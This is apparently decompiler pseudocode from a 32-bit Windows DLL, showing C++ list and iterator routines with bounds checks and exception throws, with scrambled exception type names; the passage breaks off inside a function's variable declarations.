_DWORD *__thiscall sub_100016F0(int this, _DWORD *a2)
{
  int pExceptionObject; // [esp+8h] [ebp-10h] BYREF

  if ( !*(_BYTE *)(this + 136) )
  {
    sub_1000102C(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVConhnutmnzqpnNwGcoNhnutmNzqpnnwgc_rzciu__);
  }
  sub_10001177((_DWORD *)this, a2);
  return a2;
}

//----- (10001748) --------------------------------------------------------
_DWORD *__thiscall sub_10001748(_DWORD *this, int a2)
{
  sub_1000DEB4(this, a2);
  *this = &off_10072A1C;
  return this;
}
// 10072A1C: using guessed type int (__thiscall *off_10072A1C)(void *Block, char);

//----- (10001780) --------------------------------------------------------
void __stdcall sub_10001780(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // edi
  unsigned int i; // ebx
  int (__thiscall **v7)(int, int *, int); // esi
  int v8; // eax
  int v9; // eax
  int v10; // [esp+4h] [ebp-24h] BYREF
  unsigned int v11; // [esp+8h] [ebp-20h]
  int v12[2]; // [esp+14h] [ebp-14h] BYREF
  int v13; // [esp+24h] [ebp-4h]

  v13 = 1;
  v5 = a1;
  if ( (*(unsigned __int8 (__thiscall **)(int, int *))(*(_DWORD *)a1 + 88))(a1, &a3) )
  {
    (*(void (__thiscall **)(int, int *, int *))(*(_DWORD *)v5 + 96))(v5, &v10, &a3);
    LOBYTE(v13) = 2;
    for ( i = 0; i < v11; ++i )
    {
      v7 = (int (__thiscall **)(int, int *, int))(*(_DWORD *)v5 + 76);
      v8 = (*(int (__thiscall **)(int *, unsigned int))(v10 + 44))(&v10, i);
      v9 = (*v7)(v5, v12, v8);
      LOBYTE(v13) = 3;
      (*(void (__thiscall **)(int, int))(*(_DWORD *)a5 + 36))(a5, v9);
      LOBYTE(v13) = 2;
      sub_10009F65(v12);
    }
    LOBYTE(v13) = 1;
    sub_100022C5(&v10);
  }
  LOBYTE(v13) = 0;
  sub_10002922(&a1);
  v13 = -1;
  sub_10009F65(&a3);
}

//----- (10001836) --------------------------------------------------------
_DWORD *__thiscall sub_10001836(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10001E7B(this, v3, 0);
  else
    v4 = 0;
  sub_10002A09(a2, (int)v4);
  return a2;
}

//----- (10001893) --------------------------------------------------------
_DWORD *__thiscall sub_10001893(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10001FEB(this, v3, 0);
  else
    v4 = 0;
  sub_10002972(a2, (int)v4);
  return a2;
}

//----- (100018F0) --------------------------------------------------------
_DWORD *__thiscall sub_100018F0(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10001E7B(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10002A09(a2, (int)v4);
  return a2;
}

//----- (10001955) --------------------------------------------------------
_DWORD *__thiscall sub_10001955(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10001FEB(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10002972(a2, (int)v4);
  return a2;
}

//----- (100019BA) --------------------------------------------------------
_DWORD *__thiscall sub_100019BA(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10001E7B(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10002A09(a2, (int)v6);
  return a2;
}

//----- (10001A39) --------------------------------------------------------
_DWORD *__thiscall sub_10001A39(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10001FEB(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10002972(a2, (int)v6);
  return a2;
}

//----- (10001AB8) --------------------------------------------------------
void *__thiscall sub_10001AB8(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005FB00;
  *this = &off_100729C4;
  *this = off_10072944;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100729C4: using guessed type int (__thiscall *off_100729C4)(void *Block, char);

//----- (10001AE2) --------------------------------------------------------
int *__thiscall sub_10001AE2(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10001E40(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10001B3A: variable 'v5' is possibly undefined

//----- (10001B55) --------------------------------------------------------
int *__thiscall sub_10001B55(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10001E0A(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10001BAD: variable 'v5' is possibly undefined

//----- (10001BC8) --------------------------------------------------------
void __thiscall sub_10001BC8(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10002A4D(v2);
}

//----- (10001C06) --------------------------------------------------------
void __thiscall sub_10001C06(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10002A4D(v3);
}

//----- (10001C47) --------------------------------------------------------
void __thiscall sub_10001C47(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10002A4D(v2);
}

//----- (10001C85) --------------------------------------------------------
int __thiscall sub_10001C85(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100029B6(v4);
  return v2;
}

//----- (10001CC9) --------------------------------------------------------
int __thiscall sub_10001CC9(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10002A4D(v4);
  return v2;
}

//----- (10001D0D) --------------------------------------------------------
void __thiscall sub_10001D0D(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10002A4D(v1);
}

//----- (10001D78) --------------------------------------------------------
_DWORD *__thiscall sub_10001D78(_DWORD *this, int a2)
{
  sub_1000DEB4(this, a2);
  *this = &off_1007293C;
  return this;
}
// 1007293C: using guessed type int (__thiscall *off_1007293C)(void *Block, char);

//----- (10001DB0) --------------------------------------------------------
_DWORD *__thiscall sub_10001DB0(_DWORD *Block, char a2)
{
  sub_10001AB8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001DE9) --------------------------------------------------------
_DWORD *__thiscall sub_10001DE9(_DWORD *Block, char a2)
{
  sub_1000E188(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001E0A) --------------------------------------------------------
int __usercall sub_10001E0A@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10001E40) --------------------------------------------------------
int __usercall sub_10001E40@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10001E7B) --------------------------------------------------------
_DWORD *__thiscall sub_10001E7B(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100729FC;
  a2[1] = this;
  *a2 = &off_10072A24;
  a2[2] = a3;
  return result;
}
// 100729FC: using guessed type int (__thiscall *off_100729FC)(void *Block, char);
// 10072A24: using guessed type int (__thiscall *off_10072A24)(void *Block, char);

//----- (10001EB3) --------------------------------------------------------
void *__thiscall sub_10001EB3(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005FADC;
  *this = &off_10072A24;
  *this = &off_100729FC;
  return result;
}
// 100729FC: using guessed type int (__thiscall *off_100729FC)(void *Block, char);
// 10072A24: using guessed type int (__thiscall *off_10072A24)(void *Block, char);

//----- (10001EDD) --------------------------------------------------------
bool __thiscall sub_10001EDD(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10001EF4) --------------------------------------------------------
BOOL __thiscall sub_10001EF4(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10001EFE) --------------------------------------------------------
int __thiscall sub_10001EFE(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10001F39) --------------------------------------------------------
int __thiscall sub_10001F39(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10001F6F) --------------------------------------------------------
int __thiscall sub_10001F6F(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10001F97) --------------------------------------------------------
int __thiscall sub_10001F97(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10001FD2) --------------------------------------------------------
int __thiscall sub_10001FD2(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10001FEB) --------------------------------------------------------
_DWORD *__thiscall sub_10001FEB(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100729A4;
  a2[1] = this;
  *a2 = &off_10072A44;
  a2[2] = a3;
  return result;
}
// 100729A4: using guessed type int (__thiscall *off_100729A4)(void *Block, char);
// 10072A44: using guessed type int (__thiscall *off_10072A44)(void *Block, char);

//----- (10002023) --------------------------------------------------------
void *__thiscall sub_10002023(_DWORD *this)
{
  void *result; // eax

  result = &loc_1005FAB8;
  *this = &off_10072A44;
  *this = &off_100729A4;
  return result;
}
// 100729A4: using guessed type int (__thiscall *off_100729A4)(void *Block, char);
// 10072A44: using guessed type int (__thiscall *off_10072A44)(void *Block, char);

//----- (1000204D) --------------------------------------------------------
bool __thiscall sub_1000204D(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10002064) --------------------------------------------------------
BOOL __thiscall sub_10002064(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000206E) --------------------------------------------------------
int __thiscall sub_1000206E(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (100020A9) --------------------------------------------------------
int __thiscall sub_100020A9(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100020DF) --------------------------------------------------------
int __thiscall sub_100020DF(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10002107) --------------------------------------------------------
int __thiscall sub_10002107(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10002142) --------------------------------------------------------
int __thiscall sub_10002142(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1000215B) --------------------------------------------------------
_DWORD *__thiscall sub_1000215B(_DWORD *Block, char a2)
{
  sub_10001EB3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10002177) --------------------------------------------------------
_DWORD *__thiscall sub_10002177(_DWORD *Block, char a2)
{
  sub_10002023(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100021B1) --------------------------------------------------------
int *__usercall sub_100021B1@<eax>(int *a1@<eax>, int *a2@<edi>)
{
  int v2; // eax
  int v3; // ebx

  v2 = *a1;
  v3 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_10002B4A(a2);
    if ( v3 )
      sub_1000BE8E(v3);
  }
  return a2;
}

//----- (100021D4) --------------------------------------------------------
_DWORD *__userpurge sub_100021D4@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  void *v5; // [esp-4h] [ebp-14h]

  sub_10002B1B(a2);
  *a2 = &off_10072948;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_100025CE(a2, v2, v4, v5);
  return a2;
}
// 10072948: using guessed type int (__thiscall *off_10072948)(void *Block, char);

//----- (10002228) --------------------------------------------------------
_DWORD *__stdcall sub_10002228(_DWORD *a1, unsigned int a2)
{
  unsigned int v2; // esi

  sub_10002B1B(a1);
  v2 = 1;
  for ( *a1 = &off_10072948; v2 < a2; v2 *= 2 )
    ;
  sub_10002B9E(a1, v2);
  return a1;
}
// 10072948: using guessed type int (__thiscall *off_10072948)(void *Block, char);

//----- (10002271) --------------------------------------------------------
int *__thiscall sub_10002271(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (100022C5) --------------------------------------------------------
void *__thiscall sub_100022C5(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_10072948;
  v5 = 1;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  v5 = -1;
  return sub_10001AB8(this);
}
// 10072948: using guessed type int (__thiscall *off_10072948)(void *Block, char);

//----- (10002337) --------------------------------------------------------
int __thiscall sub_10002337(_DWORD *this)
{
  return this[1];
}

//----- (1000233B) --------------------------------------------------------
int *__thiscall sub_1000233B(_DWORD *this, int a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1008F38E);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    sub_100021B1((int *)(this[3] + 8 * i - 4), (int *)(this[3] + 8 * i + 4));
  result = sub_100021B1((int *)(a2 + 4), (int *)(this[3] + 8 * a3 + 4));
  ++this[1];
  return result;
}

//----- (100023AB) --------------------------------------------------------
int __thiscall sub_100023AB(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (100023C3) --------------------------------------------------------
int __thiscall sub_100023C3(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008F38F);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_100021B1((int *)(this[3] + 8 * v2 + 12), (int *)(this[3] + 8 * v2 + 4));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_100021B1(&dword_100957A8, (int *)(this[3] + 8 * v4 + 4));
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100957A8: using guessed type int dword_100957A8;

//----- (10002420) --------------------------------------------------------
int __thiscall sub_10002420(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008F39D);
  return this[3] + 8 * a2;
}

//----- (1000243E) --------------------------------------------------------
int __thiscall sub_1000243E(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008F39E);
  return this[3] + 8 * a2;
}

//----- (1000245C) --------------------------------------------------------
void __thiscall sub_1000245C(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j__free(v2 - 1);
    }
  }
}

//----- (10002494) --------------------------------------------------------
int __thiscall sub_10002494(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // edx
  int result; // eax

  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (100024CD) --------------------------------------------------------
BOOL __thiscall sub_100024CD(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (100024D8) --------------------------------------------------------
int __thiscall sub_100024D8(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_100021B1(&dword_100957A8, (int *)(this[3] + 8 * i + 4));
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100957A8: using guessed type int dword_100957A8;

//----- (10002523) --------------------------------------------------------
unsigned int __thiscall sub_10002523(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008F39F);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10002595) --------------------------------------------------------
unsigned int __thiscall sub_10002595(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (100025BD) --------------------------------------------------------
unsigned int __stdcall sub_100025BD(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (100025CE) --------------------------------------------------------
unsigned int __thiscall sub_100025CE(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int *Blocka; // [esp+28h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      8u,
      v5,
      (void (__thiscall *)(void *))sub_10002AF1,
      (void (__thiscall *)(void *))sub_10009F65);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    Blocka = (int *)(a3 + 4);
    do
    {
      sub_100021B1(Blocka, (int *)(this[3] + 8 * v10 + 4));
      Blocka += 2;
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (10002685) --------------------------------------------------------
void *__thiscall sub_10002685(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  char *v7; // edi
  int v8; // ecx
  int *v9; // eax
  _DWORD *v10; // ebx
  char *v11; // eax
  int *v12; // edi
  char *v13; // [esp+Ch] [ebp-18h]
